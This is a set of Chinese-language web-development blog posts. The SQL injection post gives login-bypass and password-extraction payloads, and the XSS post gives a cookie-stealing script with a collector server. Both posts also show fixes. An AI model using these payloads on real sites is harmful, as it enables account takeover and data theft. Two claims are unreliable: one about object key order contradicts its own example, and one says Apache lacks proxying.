API，通過後就會拿到 JWT 前端把 JWT 的內容存在 localStorage 當前端要存取跟權限有關的資源時，加上底下的 request header 1Authorization: Bearer &lt;JWT token&gt; 後端檢查該 JWT 是否有效，有效的話就給資源，否則就拒絕 參考資料 JWT(JSON Web Token) — 原理介紹 JSON Web Token Claims","link":"/2022/06/24/what-is-json-web-token/"},{"title":"什麼是 JSONP","text":"紀錄一下～ 簡述一個為了解決「跨網域拿資料」的問題而誕生的小技巧。 一般在取得外部資料時我們會用 fetch 或者是 XMLHttpRequest 之類的方式來發出 request，但如果是 JSONP 的話我們會使用 &lt;script src=\"xxx\"&gt; 來發 request。 第一次聽到的人可能會覺得：「蛤，為什麼要這樣子做？」 這是因為透過 &lt;script&gt; 取得的資料不會有跨域限制。思考一件事情，你在用 &lt;script&gt; 去引入套件時，有哪一次會碰到瀏覽器跟你說有跨域問題的嗎？沒有吧！所以這就是 JSONP 背後的概念。 然而，這個 &lt;script&gt; 回傳的內容比較特別，可能會長得像這樣： 123456/* 呼叫 callback，並傳入一個 Object */callback({ name: 'PeaNu', age: 20, gender: 'man'}) 有沒有覺得很眼熟？不就是 callback function 嗎？只是你在前端寫的 callback 通常是長這樣： 1234/* 我預期這個 callback 執行時會被傳入一個 response */function callback(response) { console.log(response)} 把這兩個順序對調並寫在一起，好像就是你很熟悉的 JavaScript 了： 12345678function callback(response) { console.log(response)}callback({ name: 'PeaNu', age: 20, gender: 'man'}) 也就是說只要先定義好 callback，接著等人來幫你呼叫下面那一段就能在 callback 裡面拿到資料了！ 那要怎麼呼叫？就是透過 &lt;script&gt;： 1234567891011121314151617&lt;!-- client 端 --&gt;&lt;script&gt; /* 我預期這個 callback 執行時會被傳入一個 response */ function callback(response) { console.log(response) }&lt;/script&gt;&lt;!-- server 端 --&gt;&lt;script src=\"https://example.com\"&gt; /* 有人發 request 來我就 response 下面這段 */ callback({ name: 'PeaNu', age: 20, gender: 'man' })&lt;/script&gt; 這個就叫做 JSONP，因為是把資料「填充（Padding）」在 function 裡面故得其名。 最後再複習一次。之所以要這樣做是因為 &lt;script&gt; 中的 src 不會有跨網域的限制，就跟你用 &lt;img src=\"xxx\"&gt; 一樣，它不會去管什麼網域的問題，因此有人就利用這個特性發明了 JSONP。 老實說還真佩服這個人的腦袋裝了什麼，可以這麼機智。 有興趣了解更多的話可以參考我之前寫的的文章：實作 JSONP，這裡面解釋了前後端到底實際上做了什麼。","link":"/2022/01/29/what-is-jsonp/"},{"title":"什麼是物件導向","text":"經過如此多年，我才真正認識它。 簡述物件導向的特點就是都會有個「對象」，最明顯的地方是「呼叫 function 的方式」。 下面是一個用「閉包」實作出來的範例。雖然不是正規作法，但包含了物件導向的理念： 12345678910111213function createWallet(initMoney) { let money = initMoney return { deduct: (value) =&gt; { value &gt; 100 ? (money -= 100) : (money -= value) }, show: () =&gt; console.log(money) }}const myWallet = createWallet(1000)// 對 myWallet 這個對象myWallet.deduct(1000)myWallet.show() 這種對 xxx 做某件事的行為就稱為「物件導向」，以上面的例子來說，不管是 deduct 還是 show，都是在對 myWallet 這個對象來執行。所以物件導向基本上都會有一個明確的對象。 如果不是物件導向的話，就會像下面這樣，透過直接呼叫 function 的方式來完成： 12deduct(1000)show() 為什麼要物件導向？在物件導向的世界哩，會把每樣東西都看成是一個一個的「對象（模組）」，這樣的好處有幾點： 比較好管理（模組化） 可以避免有人直接操控變數之類的問題。","link":"/2022/03/18/what-is-oop/"},{"title":"什麼是正向代理與反向代理","text":"一個很人性化的設計。 正向代理其實不複雜，只要你能理解正向代理的意思，那反向代理馬上就能懂，因為真的只是「反過來」而已。 先來看一下什麼是正向代理： 簡單來說，有些時候你想造訪的網站會「擋 IP」，例如一些中國的網站，只要你不是用中國 IP 連的話都會被擋，沒辦法連上去。 這個時候就可以透過「Proxy」來幫你處理這個問題，他的流程就跟上面的圖一樣： 從 client 發一個 request 到 proxy proxy 再根據內容對 server 發出 request server 看到 proxy 以為是中國的 IP，就把 response 回傳給 proxy proxy 再把拿到的東西傳回給 client 你可能會想說「那 server 不會知道是 proxy 發過來的嗎？」，這時候換位思考的重要性就來了： 剛剛第一張圖是從 client 的角度來看，所以你當然會知道「我是透過 proxy 來發 request」的這件事。可是對 server 來說不是這樣，它只會知道有人發了一個 request 過來，但是不是透過 proxy？它基本上不會知道（還是有一些特例啦），而且也不會知道是哪個 client 發過來的（這個很重要很重要）。 所以呢，這就是為什麼 proxy 可以運作的原理。 用 proxy 的好處從上面例子來看會發現兩個好處： 加強隱私：client 可以把自己的資訊隱藏不讓 server 知道 解除限制：就算會擋 IP 的網站我還是可以連上去 除了這兩個以外，proxy 還有另外一個好處是「Cache 機制」。 在有些情況下，proxy 可以把很常出現的 request 給 cache 起來，當下次有人再發同樣的 request 時，直接把 cache 的東西回傳就好，不用再特地對 server 發一次 request。 反向代理上面有聽懂的話這個就好講了，跟剛剛幾乎一樣，只是身分對調過來而已： 既然 client 可以透過 proxy 來發 request，那 server 也同理，可以透過 proxy 來處理 request。 你可能會想說「確實如此，不過這要幹嘛阿？」 要知道原因就得先了解一些網路基礎概念。 首先當我們架了一台 server 跑 HTTP 服務時，通常會讓它跑在 80 port（端口），聽起來蠻合理的。可是其實有個問題，假設 server 也有其他服務要跑的話，就得再加開其他的 port 來跑，畢竟你不可能為了加開一項服務再去買一台主機吧（錢太多可以分我 QQ）。 總而言之，這樣做的問題是「網址會變得很難看」： 附註：預設是跑 80 port，所以第一個才不用加上 :80 簡單來說，你應該從來不會用什麼 https:facebook.com:3001 或 https://google.com:8001 來連到 FB 或 Google 吧？我說的很醜就是這個意思，搞不好你連 port 是什麼東西都不知道，怎麼可能還指望你來我的網站時還要加上端口號？ 但這時候有 proxy 就不一樣了，這個技巧是「80 port 拿來跑 proxy，proxy 在透過子網域來判斷要把 request 交給哪個 server」 這樣子做以後，就不用在輸入端口號這麼麻煩了，因為 proxy 都幫你設定好了。這也是為什麼有些人會推薦用 Nginx 來架伺服器的原因，因為 Nginx 有提供 prxoy 的功能，而 Apache 沒有。 不過還是要注意剛剛提到的換位思考： 對 client 而言也一樣，它不會知道發出去的 request 是真的 server 還是 proxy，這點很重要。","link":"/2022/03/28/what-is-proxy-and-revers-proxy/"},{"title":"這個迴圈可能跟你想的不一樣","text":"這篇的標題實在命名障礙。 簡述直接來看段例子： 1234567const obj = {}const array = [5, 4, 3, 2 ,1];for (const item of array) { obj[item] = `this is ${item}`;}console.log(obj); 你覺得答案會是哪個？ 12345678910111213141516// 第一種{ '1': 'this is 1', '2': 'this is 2', '3': 'this is 3', '4': 'this is 4', '5': 'this is 5'}// 第二種{ '5': 'this is 5' '4': 'this is 4', '3': 'this is 3', '2': 'this is 2', '1': 'this is 1',} 我知道！迴圈是按照 5 4 3 2 1 來跑的，所以是「第二種」！ 這也是我原本的想法，不過正確答案是「第一種」。 你可能會想說「那應該是因為 array 存的是數字的關係吧？」 好，那我們來試試看存成字串是不是就和我們想的一樣了？ 1234567const obj = {}const array = ['5', '4', '3', '2' ,'1'];for (const item of array) { obj[item] = `this is ${item}`;}console.log(obj); 直接拿到 console 跑，你會發現結果一樣，而且還被轉成數字了： 好，說到這裡其實只是想講清楚兩件事： Object 的 key 如果是數字，那會「由大到小」來排，而不是你「放進去的順序」 如果你存的「字串」長的太像數字（上面的例子），就會被轉成「數字」 還是不懂的話這再舉最後一個例子給你參考： 123456const obj2 = { '100': 'yo', '50': 'yo', '10': 'yo'}console.log(obj2); // {10: 'yo', 50: 'yo', 100: 'yo'} 可是我如果就是想用數字的形式來儲存 key 的話怎麼辦？記得剛剛說的嗎，我說如果你存的字串太像數字的話才會被轉成數字。 所以反其道而行，不要讓它看起來那麼像數字就好了： 附註：實際案例可以參考 JavaScript 整理資料的範例 123456const obj2 = { ' 100': 'yo', ' 50': 'yo', ' 10': 'yo'}console.log(obj2); 沒錯，就是加上一個「空格」。這樣就不會被當成數字了，順序也會依照你所想的來排。","link":"/2022/03/17/what-is-real-order/"},{"title":"到底什麼是 RESTful？","text":"終於瞭解它了。 簡述RESTful（Representational State Transfer）表現層狀態轉換；它的名字沒有很重要，只是讓你們知道一下而已。 但重要的事情是： 它是一種「風格」，不是「規範」 它是一種「風格」，不是「規範」 它是一種「風格」，不是「規範」 就好像每個人都有自己的 coding style，但總會有幾個比較主流的風格，像是 camelCase，isBoolean 等等這種大家都認同的約定俗成。RESTful 也是一樣，只是他是應用在 API 上面的一種風格。 你可以不照著大家的風格走，但別人就得多花心思看你寫的東西就是了。 RESTful 也就是這樣的概念而已，照著這個風格去設計 API，會讓大家用 API 的時候比較順。說穿了它的本意只是「希望你好好的善用 HTTP 提供的動詞來設計 API」，僅此而已。 如果沒有 RESTful 的話？沒有 RESTful 的話，一個 API 可能會被設計成這樣子： 從這張圖可以先看到一些問題，像是「刪除使用者」跟「更改使用者」怎麼會都是 POST？不是應該要用 DELETE 跟 PATCH 嗎？再來，每個功能都得特地建立一個新的網址路徑，是不是有點麻煩？ 你可能會想說為什麼可以這樣子寫？但如果你寫過一點點的後端的話（不懂可以參考 這裡），就會知道不管是用哪個 HTTP 方法都不會影響你接下來要做的事情。 原因是這樣子，每個功能都對應到不同的網址，所以只要有人發送 request 到這隻 API，管他要用 POST 還是 GET，後端都可以做相對應的處理。 也許這樣子還是可以實現該有的功能，但終究還是會碰到一些小麻煩： 1. 每個人的命名風格不同 以上面的「新增使用者」來說，A 可能想取 new_user，B 可能想取 creat_user，C 可能想叫creat_new_user，那最後到底該叫什麼才好？如果沒有一個統一的風格就會變得很麻煩。 2. 每個人的動作不一致 A 可能覺得要存取使用者資料就該用 GET，B 覺得無所謂；或是 A 決覺得刪除使用者資料該用 DELETE，B 覺得 POST 也沒差阿，反正只要發到正確的網址我都還是可以處理阿。 為什麼會有這種問題？因為 HTTP 規定的只是你在「溝通」的時候要遵循 GET POST DELETE 這些格式，但並它沒有規範你在收到訊息後的「實際行為」。 以訂便當的例子來說，如果有個新來的同學不知道「訂便當」要用 POST 代號，所以他寫成GET： 1234GET送達時間：第四堂雞腿飯 5雞排飯 2 最後收到這張紙條的人雖然看到上面寫的是 GET，但還是能從內容判斷出這個請求是要「訂便當」，也就是 POST，所以依然可以幫他完成訂便當的動作。 換成 HTTP 也是同樣的概念，你在前端要發 request 一定要遵循 HTTP 的方式來溝通，但後端接到 request 後他「實際要做什麼」，都不在 HTTP 規範的範圍裡。 如果有了 RESTful？ 為了解決上面的問題，RESTful 提出一個很簡單的概念：把資源給統一化 仔細想一下，其實不管是新增、刪除、查詢等等的動作，我們都是在對 users 這個資源做事情，那為什麼不乾脆就統整成 users，再搭配 HTTP 提供的那些動作來做區分就好？ 以上面例子來說，要讓 /users 這個網址同時處理「新增」跟「刪除」這兩個動作，你只要發送一個 POST 或 GET 的請求我就能看出來你想做的是什麼，所以就不必在分成 /new_user 或 /creat_user 了。 總而言之，RESTful 只是一個「風格」，不是「規範」，你不想使用也沒關係。這就跟在寫 HTML 的時候很像，HTML 沒有規定你一定要用 &lt;article&gt;、&lt;section&gt; 那些語意標籤。你可以都不要用那些標籤，一路 &lt;div&gt;、&lt;span&gt; 到底。 這會怎麼樣嗎？不會，只是沒有這麼一目了然而已。","link":"/2022/01/05/what-is-restful/"},{"title":"什麼是伺服器？","text":"解除多年疑惑。 簡述伺服器其實只是一台裝了「伺服器程式」的電腦，例如：Apache 就是一種伺服器程式。 所以呢，只要你在自己的電腦上裝伺服器程式，就可以說它是一台「伺服器」。 談談關於伺服器主機雖然說只要安裝伺服器程式就可以當成是一個伺服器，不過有幾個問題： 正常人不會想讓電腦 24 小時全年無休的開著吧？ 家裡電腦的網路有可能是浮動 IP，一直變來變去的話別人是要怎麼連？ 所以接下來會來介紹幾種建立伺服器的方式： 實體主機 虛擬空間 虛擬主機 實體主機這個就是前面講的，在「實體電腦」上安裝伺服器程式來用，例如我現在用的電腦就是一台實體主機。不過常見的做法是去外面跟人家「租一台」實體主機來用，為了避免前面提的那些問題。 實體主機的特性是使用者擁有「主機的控制權和資源」，所以想怎麼搞都可以。 不過有一個很大的缺點：當實體主機壞了，東西就壞掉了。 虛擬空間一台電腦的某個空間（像是資料夾），你沒有這台電腦的所有控制權，只侷限在我給你的這個空間（資料夾）裡面，你可以放檔案在這裡，但不可以裝新的伺服器程式也不能玩遊戲。 實際例子：只能用 FTP 來傳檔案，因為沒有控制權。 虛擬主機（目前的主流）本質也是一台「實體主機」，但裡面可以有很多個虛擬主機，就像我可以在電腦上同時裝 Mac、Linux 系統的道理差不多。 簡單來說可以想成是跟別人共用一台電腦的概念，但跟虛擬空間不同的是所有人都有這台主機的控制權，可以安裝伺服器程式、也可以放自己的網站之類的。 另外是資源要跟大家共享，例如說實體主機只有 4GB 的 RAM，現在有四個虛擬主機，代表每個虛擬主機只能分配到 1GB 的 RAM。 好處是不用擔心「實體主機壞掉」的問題，因為虛擬主機可以再遷移到別的實體主機上。原理可以想成是虛擬主機也是某種「程式」，只要把程式放到別的主機上來跑一樣能運作。 管理主機的方法關於虛擬主機，你可能會好奇「電腦不在我這裡的話，要怎麼操控它？」，所以這邊會做個解釋。 比較常見的作法有兩種： 遠端桌面 透過某種方式連到遠端電腦，把畫面顯示到自己的電腦上（Window 比較常見）。 SSH（Secure shell） 透過 CLI 來連到遠端的主機，接著就能「下指令」來操控。 連到虛擬主機的畫面大概就長這樣： 跟一般的 GUI 不同，你只能透過 CLI 來跟它溝通，這時候就考驗你對 CLI 的熟悉度了。","link":"/2022/03/09/what-is-server/"},{"title":"用 SQL Injection 來玩壞資料庫","text":"很有趣！ 簡述SQL Injection 的攻擊原理就是把原本的 SQL 扭曲成別的意思。 要怎麼做到？就是添加「額外的 SQL」，讓原本 SQL 的意思改變（念起有點饒口，但就是這個意思）。 接下來用留言版來舉例會比較好懂一點。 範例一：登入別人的帳號要改變 SQL 的意思就要先知道原本的 SQL 是怎麼寫的，所以來看一下登入的 SQL 片段： 12345&lt;?php $username = $_POST['username']; $password = $_POST['password']; $sql = \"SELECT * FROM users WHERE username='$username' AND password='$password'\";?&gt; 這裡的 SQL 意思是「從資料庫撈出 帳號=xxx，密碼=xxx」的欄位。 現在我想把他改成「從資料庫撈出 帳號=xxx」的欄位，我可以思考怎麼用 $username 跟 $password 這兩個東西來達成（因為這是我可以輸入內容的地方）。 有沒有辦法讓 $username 後面的部分都變成註解？還真的有，就是 #。知道這個後就可以把 $username 填成這樣： 1peanu'# 這時候 SQL 就會變成這樣： 1SELECT * FROM users WHERE username='peanu'#' AND password='aaaaaaaa' （# 後面的內容都會當成註解，所以 password 想打啥就打啥） 接著就成功登入 peanu 的帳號了： 範例二：登入隨便一個人的帳號範例一的延伸，其實你甚至可以把 $username 改成這樣子： 1' OR 1=1# 意思是從資料庫撈出 帳號=空字串 OR 1=1 的欄位，因為 1=1 永遠代表 true，所以就會把所有的 user 都撈出來： 備註：這裡 cookie 存的值就是 ' OR 1=1;，所以當首頁用 cookie 去撈資料時就跟登入的邏輯一樣，直接撈出所有 user 的資料，並回傳第一欄的內容。 範例三：一次新增多筆留言首先補充一個 SQL 的知識，你知道 INSERT INTO 的 VALUE() 其實可以放多個值嗎？像這樣： 1INSERT INTO comments(`nickname`, `content`) VALUES ('Grapes', 'oops'), ('hack', '水哦'); 而我們在處理新增留言的時候是這樣拼接的： 123&lt;?php $sql = \"INSERT INTO comments(`nickname`, `content`) VALUES ('Grapes', '%s')\";?&gt; 兩個比對一下，就會發現 %s 的內容可以這樣填： 1oops'), ('hack', '水哦 酷是蠻酷的，但這樣可以做什麼嗎？等一下再告訴你。 範例四：撈出某人的帳號密碼再補充一個 SQL 知識，你知道 SQL 裡面可以在包另一個 SQL 嗎？像這樣： 12INSERT INTO comments(`nickname`, `content`) VALUES ('peanu', (SELECT password FROM users WHERE id=113)); 這種 SQL 叫做「subquery（子查詢）」。 然後這邊的意思是新增一個欄位到 comments。nickname 的內容是 peanu，content 的內容是 users 中 id=113 的 password 欄位。 所以一樣來玩拚字遊戲，首先來看原本的 SQL 邏輯： 123&lt;?php $sql = \"INSERT INTO comments(`nickname`, `content`) VALUES ('Grapes', '%s')\";?&gt; 這邊要搭配範例三的邏輯，把要撈資料的 SQL 當成第二組 VALUES： 1234抓到你囉'), ( (SELECT username FROM users WHERE id=113), (SELECT password FROM users WHERE id=113))# 這時候的 SQL 長這樣： 12345INSERT INTO comments(`nickname`, `content`) VALUES ('Grapes', '抓到你囉'), ( (SELECT username FROM users WHERE id=113), (SELECT password FROM users WHERE id=113))#') 掌握這種技巧後就跟 XSS 一樣，只要你夠有「創意」，資料庫就任你玩。 解決辦法這邊會用 PHP 內建的 prepared-statement 來改寫。 它的概念就跟防 XSS 一樣，把 SQL 的參數部分都當轉成「純字串」來處理。雖然不是每個 SQL 都有被攻擊的風險性，但保險起見最好是把所有用到 SQL 的地方都做跳脫會比較好。 這邊簡單示範一下 prepared-statement 的用法： 1234567891011// login.php&lt;?php // 先準備好 sql，參數的部分改用 ? 這個 placeholder 來代替 $sql = \"INSERT INTO comments(`nickname`, `content`) VALUES (?, ?)\"; // 接著把 sql 指令丟到 prepare()，進入準備階段 $stmt = $conn-&gt;prepare($sql); // 接著把值做綁定（綁定階段），'ss' 是代表兩個參數都是 string $stmt-&gt;bind_param('ss', $nickname, $content); // 到這邊才是真的執行 sql $result = $stmt-&gt;execute();?&gt; 把所有 SQL 指令都改寫後就能避掉 SQL Injection 囉：","link":"/2022/02/09/what-is-sql-injection/"},{"title":"什麼是 Schema（結構）","text":"死機麻。 到底什麼是 Schema（結構）？其實就是一個 table 的內容簡述，像是這個欄位代表什麼啦，有沒有預設值、可不可以是空值之類的，這個就是「Schema（結構）」。我們可以根據需求來設計 Schema 。 參考 myphpadmin 上的結構： 備註：跟編碼有關的設定建議用 utf8mb4_general_ci 來設定。 像 id 欄位的 schema 就是： 類型是 =&gt; int 編碼排序 =&gt; 沒設定 屬性 =&gt; 沒設定 空值 =&gt; 不可以空 預設值 =&gt; 無 額外資訊 =&gt; Auto Increment 每個欄位的 schema 都不同，但不管怎麼設定，「名稱」「型態」這兩個是一定會有的。 一些其他的 Schema 設定 A_I 自動遞增（Auto Increment），保證不會重複。 CURRENT_TIMESTAMP 讓資料庫自己判斷建立時間。 Primary Key（主鍵），代表 table 中最重要的東西，而且不能重複，例如 id。 Unique 代表不能重複，違反的話會被資料庫擋下來。 Index 讓你可以比較快找到資料。當資料多的時候就會有感了。","link":"/2022/01/30/what-is-schema/"},{"title":"重新理解 this 的值","text":"人稱 JS 的頭號公敵。 this 最原始的用途回歸到原點，其實 this 本身就是為了物件導向而存在的東西，用來指向你建立出來的 instance。 例如說： 1234567891011class Dog { constructor(name) { this.name = name } getName() { return this.name }}const dog1 = new Dog('PeaNu')console.log(dog1.getName()) // PeaNu 首先，我透過 Dog 建立了一個 instance：dog1 記住，只要是出現在 dog1 裡面的 this 都一律代表它自己，不會有任何例外情形發生。在物件導向下的 this 就是這麼單純，沒有一大堆莫名其妙的情況發生。 所以我一開始給 dog1 的 name 是 PeaNu，那麼它裡面的 this.name 就只會是 PeaNu。 之後如果又建立了另一個 dog2，把它的 name 設為 PPB，那它的 this.name 也只會是 PPB，跟 dog1 一點關係也沒有。 總而言之，this 的初衷就是用來代表「這個 instance」的意思，非常非常非常單純。 在非物件導向的環境下，this 的值沒有意義如果你硬要在不是物件導向的地方用 this，就會出現一些奇怪的結果： 1234function test() { console.log(this)}test() // window / global / undefind (strict mode) 在這種情況下，this 就會根據不同的環境而有不同的值。 undefined，在使用嚴格模式下的預設值 window，在瀏覽器下的預設值 global 在 Node.js 下的預設值 不管最後的值是什麼，這種 this 都沒什麼意義，所以才會有這個標題。 想知道 this 值，得看是怎麼呼叫的，不是宣告舉個例子： 12345678910'use strict'const obj = { a: 'yoyo', test: function () { console.log(this) }}obj.test() // objconst func = obj.testfunc() // undefined 同樣都是呼叫 test，但第一個結果是 obj，第二個結果是 undefined，為什麼？因為呼叫的方式不同。 第一個 test 是透過 obj 來呼叫的，而第二個是直接執行 func，這兩種的呼叫方式是不一樣的。所以儘管 test 是宣告在 obj 這個物件裡，但只要用不同的方式來呼叫它，this 的值就會不同。 再次強調： 重點是怎麼呼叫，而不是宣告 重點是怎麼呼叫，而不是宣告 重點是怎麼呼叫，而不是宣告 所以再出一題來考考你，下面的 this 值會是什麼？ 1234567891011121314'use strict'const obj = { a: 'obj', test: function () { console.log(this) }}const obj2 = { a: 'obj2', test2: obj.test}obj2.test2() // ??? 想完後就貼到 console，看跟自己想的一不一樣。 透過 call、apply 和 bind 來改變 this 值既然 this 值會變來變去的，那有沒有辦法控制它？ 有，就用 call、apply 和 bind 來控制，舉個範例： 123456789'use strict'function test() { console.log(this)}test() // undefinedtest.call('this is call') // this is calltest.apply('this is apply') // this is apply call 和 apply 是另一種執行 function 的方式，跟 () 的差別在於它們可以傳入一個參數，這個參數就是用來指定 this 的值，你傳什麼進去就會出來什麼。 至於 bind 比較特別一點，一樣先看例子： 123456789'use strict'function test() { console.log(this)}const bindFunc = test.bind('this is bind')bindFunc() // this is bindbindFunc.call('is this call?') // this is bindbindFunc.apply('is this apply?') // this is bind 首先 bind 的作用不是用來呼叫 function，而是把綁定 this 後的 function 給回傳，以上面的例子來說就是 bindFunc。 這時候你再用 call 或 apply 來呼叫也沒有用，this 值只會是一開始綁定的那個值，不能被改變。 一種快速判斷 this 值的技巧在知道 call 怎麼使用以後，你就可以用這種角度來思考： 123456789101112131415'use strict'const obj = { a: 'obj', test: function () { console.log(this) }}obj.test() // objobj.test.call(obj) // objconst func = obj.testfunc() // undefinedfunc.call(undefined) // undefined 透過這種把 function 前面的東西丟到 call 裡面，會幫助你更好判斷 this 值是什麼。不過還是要強調一下，這只是方便記憶，也許在 90% 的情境下是正確的，但不要忘了還是有 10% 的可能是錯的。 例外狀況事件監聽器在事件監聽下的 this 值會是被綁定的元素： 12345678910111213&lt;ul&gt; &lt;li&gt;&lt;button&gt;click&lt;/button&gt;&lt;/li&gt; &lt;li&gt;&lt;button&gt;click&lt;/button&gt;&lt;/li&gt; &lt;li&gt;&lt;button&gt;click&lt;/button&gt;&lt;/li&gt; &lt;li&gt;&lt;button&gt;click&lt;/button&gt;&lt;/li&gt;&lt;/ul&gt;&lt;script&gt; document.querySelector('ul').addEventListener('click', function (e) { console.log(this) // ul console.log(this === e.targer) // false })&lt;/script&gt; 這裡綁定的是 ul，所以每當觸發 click 時，this 值就會是 ul 這個元素。（注意不是 e.target） 箭頭函式注意：這邊的範例是以 Node.js 為主，如果是瀏覽器的話結果可能不太一樣。 宣告的那個地方 this 值是什麼，出來就是什麼。 箭頭函式跟一般函式差別最大的地方就是這裡，它只在意「宣告」的地方，不會管「呼叫方式」。 12345678910111213141516'use strict'const obj = { a: 'obj', whatIsThis: this, test1: function () { console.log('normal function: ', this) }, test2: () =&gt; { console.log('arrow function:', this) }}console.log(obj.whatIsThis) // {}obj.test1() // obj 自己obj.test2() // {} 一個一個來看，首先在 obj 裡定義了 whatIsThis 來確認裡面的 this 值是什麼，得到的結果是 {}。 接著呼叫 test1，按照前面所說，一般函式的 this 值會根據呼叫的方式來決定 this 值，而這裡是透過 obj 來呼叫的，所以 this 值就是 obj 本身，符合推論。 再來是 test2，也如同前面所說，箭頭函式的 this 值只管宣告的地方，所以宣告的地方是 obj 裡面，而 obj 裡的 this 值是 {}，所以最後的結果確實是 {}。 最後再出一題考考你，答得出來就代表你能分辨箭頭函式和一般函式的差別了： 1234567891011121314151617181920212223'use strict'const obj = { a: 'obj', whatIsThis: this, test1: function () { console.log('normal function: ', this) }, test2: () =&gt; { console.log('arrow function:', this) }, test3: function () { console.log('outter normal function:', this) setTimeout(() =&gt; { console.log('inner arrow function', this) }, 1000) }}console.log(obj.whatIsThis) // {}obj.test1() // obj 自己obj.test2() // {}obj.test3() // ???","link":"/2022/03/18/what-is-this/"},{"title":"在學版本控制前，先理解三件事","text":"在學版本控制之前，我覺得先理解以下幾個問題，會對學習更有幫助： 什麼是版本控制？ 為什麼要用版本控制？ 為什麼要讓軟體來幫我們做版控？ 什麼是版本控制？你一定做過報告吧？那你的報告檔案是不是會像這樣：報告 01 -&gt; 報告 02 -&gt; 報告最終版 -&gt; 報告真的最終版。 這個其實就是「版本控制」。一個檔案你可能有很多個版本，但你又希望每個版本都能保存下來，接著為了知道每個版本之間的差異，你透過「命名」的方式來表示它們之間的關係。 為什麼要用版本控制？如同上面所說，一個檔案可能有很多個版本，但你可能會怕之後不小心做壞了，所以為了避免這種搞壞了要全部重做的事情發生，我們會希望有一個「備用方案」的檔案。 所以「保存」其實就是我們做版控最主要的目的。 然而，當規模小的時候，你可以用「報告 01、報告 02，報告 03，…」這樣子的方式來做版控，但是當規模很大的時候，這就不是一個很好的做法（後面會解釋為什麼）。 這個時候你就會需要「讓程式來幫你做版本控制」。 為什麼要讓軟體來幫我們做版控？想想看這個情境：假設有一份專案，目前有一個「穩定版」的版本。現在我們想要開發新功能，所以就繼續從穩定版的那個版本來做： 12-&gt; 穩定版-&gt; 穩定版 + 開發新功能 但是如果現在 PM 突然跟你說有 Bug 需要修復，你該怎麼做？ 是不是只能先把新功能拿掉，把 Bug 修復完畢，接著再重新開發新功能： 12345678-&gt; 穩定版-&gt; 穩定版 + 開發新功能=== PM 說先修 Bug ===-&gt; 拿掉新功能，先修復 Bug-&gt; 修復 Bug 後的穩定版（發佈出去）-&gt; 修復 Bug 後的穩定版 + 開發新功能 （因為你不能把還沒開發完的新功能給一起發佈出去，所以你一定要先拿掉新功能，修好 Bug，接著才把修復好的檔案發佈。） 這種做法叫做「一條線的開發方式」。這種方式有個很大的問題：你沒有辦法同時處理多個事情。 但是，現在如果透過版控軟體（例如 Git）就可以建立一個出「分支（兩條線）」的概念： 12A 線：穩定版 -&gt; 新功能 -&gt; 新功能 -&gt; ...B 線：穩定版 -&gt; bug fix -&gt; bug fix -&gt; ... 你要開發新功能，就在 A 線這條分支上開發；你要修復 Bug，就在 B 線這條分支上修復，不需要像剛才一樣，先把新功能拿掉，接著再來修 Bug 這麼麻煩。 接著，當新功能開發完成後，我們不需要 A 線這條分支了，所以我們會把 A、B 合併起來（假設把 A 併到 B），就會變成這樣： 1B 線：穩定版 -&gt; bug fix -&gt; bug fix -&gt; ... -&gt; 新功能 -&gt; ... -&gt; 新功能 -&gt; 正式發佈 所以透過版控軟體，大家就可以在 A 線或 B 線上各做各的事情，不用擔心彼此之間會互相干擾。 最後當其中一條線的任務完成時，只要透過「合併」的方式來變回一條線，就完成團隊之間的協作了。","link":"/2021/12/12/what-is-version-control/"},{"title":"從玩壞自己的網站來學習 XSS","text":"壞掉啦～ 簡述XSS（Cross Site Scripting）跨網站指令碼。 簡單來說就是「在別人的網站上執行程式碼」，等一下我會用各種方式來示範怎麼把自己的網站玩壞，讓你一目了然 XSS 在做什麼，以及該如何防範 XSS。 在示範之前也解釋一下為什麼會有 XSS。其實說穿了就是寫網站的時候沒有對使用者的輸入內容做處理而產生的漏洞。所以要防範 XSS 就要把這句話銘記在心： 永遠不要相信 Client 端的輸入內容 意思就是說你不要預期使用者會照著你腦裡的想法走，你可能預期他會在輸入框輸入「Hello, I'm friendly」，但不是這樣，絕對會有那種硬要輸入「&lt;script&gt;alert(\"Yo, I\\'m bad guy\")&lt;/script&gt;」的人存在。 所以在強調一次： 永遠不要相信 Client 端的輸入內容 永遠不要相信 Client 端的輸入內容 永遠不要相信 Client 端的輸入內容 來搞破壞吧！攻擊一：Yo，駭客就是要高調到讓全世界都知道。 簡單來說就是惡作劇啦～ 攻擊二：釣魚釣魚釣到什麼魚？ 通常是用來把使用者帶到一個跟原網站長的很像的「釣魚網站」來做壞事。 攻擊三：餅乾怪獸的逆襲，全世界的 Cookie 都是我的，是我的！ 既然 document.cookie 可以存取「使用者在這個網站儲存的 cookie」，那麼只要發揮「創意」，就可以把 cookie 送到駭客想要的地方（當我 foodpanda？），例如說： 12345678910// 駭客想要送到的地方let address = 'http://localhost:5000'// 建立 &lt;img&gt;let img = document.createElement('img')// 存取 cookie 的代碼let cookie = document.cookie// 設定 &lt;img src=\"http://localhost:5000?cookie=value\"&gt;img.setAttribute('src', `${address}/?cookie=${encodeURIComponent(cookie)}`)// 插到 DOM 裡面document.body.appendChild(img) 假裝自己是駭客，架一個伺服器來玩玩看是不是真的能偷到： 輕輕鬆鬆拿到手！現在所有來這個網站的人的 cookie 都會送到我手上 ლ(•ω •ლ) 解釋一下這邊在做什麼。簡單來說是插入一個根本不會顯示出來的圖片，目的是要利用 src 來發 request，把拿到的 cookie 送到駭客那邊，這就是最典型的偷 cookie 方式。 不要懷疑，所有用到外部資源的的東西，像是 &lt;link href=\"...\"&gt; &lt;img src=\"...\"&gt; 其實都會發出一個 request，只是你太少去注意了所以不會發現背後是這樣子。 最後附上駭客的伺服器邏輯怎麼寫的： 12345678910111213141516// 建立 http sever 的模組const http = require('http')// 解析 url 的模組const url = require('url')// 伺服器設定const server = http.createServer((req, res) =&gt; { // 解析 url 的物件 {cookie: 'xxxx'} const queryObject = url.parse(req.url, true).query const cookie = queryObject.cookie // 把拿到的 query string 做解碼後印出來 console.log('get cookie:', decodeURIComponent(cookie)) // 送出空的 response res.end()})// port=5000server.listen(5000) 其實就是一個非常陽春的 http server 而已。 攻擊四：你以為只能靠留言？太天真了，哈哈哈哈哈哈 這個例子是想強調任何使用者可以輸入的地方都有 XSS 的風險存在，所以你絕對要銘記那句老話： 任何來自 Client 端的輸入內容都是不能相信的 掌握這個大原則就能避掉大部分的危險了。 修補 XSS 漏洞修補的概念也很簡單，既然 &lt;script&gt;...&lt;/script&gt; 會被解讀為程式碼，那就「跳脫」成純字串就好，總之就是把所有使用者的輸入內容都當作「純文字」來輸出就可以了。 